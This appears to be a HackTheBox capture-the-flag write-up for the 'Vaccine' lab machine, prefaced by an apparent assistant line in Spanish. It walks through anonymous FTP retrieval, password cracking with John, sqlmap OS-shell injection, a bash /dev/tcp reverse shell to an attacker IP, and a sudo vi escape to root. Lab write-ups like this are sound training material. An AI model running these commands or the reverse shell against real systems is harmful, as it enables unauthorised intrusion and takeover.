Aquí tienes el writeup de Vaccine en inglés profesional:
markdown

# Vaccine

**Platform:** HackTheBox  
**OS:** Linux  
**Difficulty:** Easy  
**Date:** April 2026

---

## Summary

Linux machine exposing FTP with anonymous access containing a 
password-protected ZIP archive. Cracking the archive reveals admin 
credentials for a web dashboard vulnerable to SQL injection. 
Database credentials found in web files allow SSH access as postgres. 
A misconfigured sudo rule allows privilege escalation to root via vi.

---

## 1. Reconnaissance

Port scan using nmap:
```bash
nmap -sCV -p- -A 10.129.18.195
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 |
| 22 | SSH | OpenSSH 8.0p1 |
| 80 | HTTP | Apache 2.4.41 |

---

## 2. FTP Enumeration

Connected anonymously to FTP:
```bash
ftp 10.129.18.195
# username: anonymous
# password: (blank)
get backup.zip
exit
```

---

## 3. Cracking the ZIP Archive

Generated a hash from the ZIP:
```bash
zip2john backup.zip > hash.txt
```

Extracted and cracked rockyou wordlist:
```bash
sudo cp /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz ~
tar -xzf rockyou.txt.tar.gz
john hash.txt --wordlist=~/rockyou.txt
```

ZIP password found: **741852963**

Extracted the archive:
```bash
unzip backup.zip
```

Found `index.php` containing an MD5 hash for the admin user:
```php
md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"
```

Cracked the MD5 hash:
```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > md5hash.txt
john md5hash.txt --wordlist=~/rockyou.txt --format=Raw-MD5
```

Admin password found: **qwerty789**

---

## 4. SQL Injection via sqlmap

Logged into dashboard with `admin:qwerty789`.
Copied PHPSESSID cookie from Firefox DevTools (F12 → Storage → Cookies).
```bash
sqlmap -u "http://10.129.18.195/dashboard.php?search=test" \
--cookie="PHPSESSID=" --os-shell
```

Obtained os-shell as postgres user.

Started listener:
```bash
nc -lvnp 4444
```

Executed reverse shell from os-shell:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.219/4444 0>&1'
```

Retrieved user flag:
```bash
cat /var/lib/postgresql/user.txt
```

---

## 5. Privilege Escalation

Found postgres credentials in web files:
```bash
cat /var/www/html/dashboard.php
# $conn = pg_connect("...password=P@s5w0rd!");
```

Upgraded to interactive shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Checked sudo permissions — postgres can run vi as root:
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
# password: P@s5w0rd!
```

Escaped to root shell from inside vi:

:shell


Retrieved root flag:
```bash
cat /root/root.txt
```

---

## 6. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| ftp | Anonymous file retrieval |
| zip2john | ZIP hash extraction |
| John The Ripper | Password cracking |
| sqlmap | SQL injection and OS shell |
| netcat | Reverse shell listener |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| Anonymous FTP | Sensitive backup file exposed publicly |
| Weak Hashing | Admin password stored as MD5 |
| SQL Injection | Authenticated SQLi in search parameter |
| Plaintext Credentials | DB password hardcoded in PHP file |
| Sudo Misconfiguration | vi allowed as root via sudo |
